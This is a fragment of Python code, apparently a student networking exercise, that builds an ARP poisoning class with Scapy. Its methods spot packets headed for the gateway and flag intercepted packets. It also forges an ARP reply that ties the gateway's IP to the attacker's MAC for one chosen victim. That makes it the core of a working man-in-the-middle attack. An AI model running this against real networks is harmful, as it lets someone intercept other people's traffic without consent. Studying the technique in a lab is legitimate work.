...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet) -> bool:
        ...
        """
        bool1 = packet[S.Ether].dst==self.gateway_mac # check if paket mac belong to the router
        bool2 = packet[S.IP].src!=self.our_ip         # check if paket ip not belong to me
        bool3 = packet[S.Ether].src!=self.our_mac     # check if paket mac not belong to me
    ...
    def is_stolen_packet(self, packet) -> bool:
        ...
        Note: You may assume all packets have both IP and Ethernet layers.
        """
        bool1 = packet[S.Ether].dst==self.our_mac  # if the mac address is mine
        bool2 = packet[S.IP].dst!=self.our_ip      # if the ip we get is diffrent then mine
        # the router in my house is the only one to get pakets with not his owns ip
    ...
    def create_poison(self, victim_packet):
        ...
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        poison = S.ARP(op=2,                              # tell the target machine our info
                        hwsrc=self.our_mac,               # the mac address to send is our mac address 
                        psrc=self.gateway_ip,             # the ip address to send to is the router ip
                        hwdst=victim_packet[S.Ether].src, # the target mechine detiles (mac)
                        pdst=victim_packet[S.IP].src)     # the target mechine detiles (ip)
        return poison
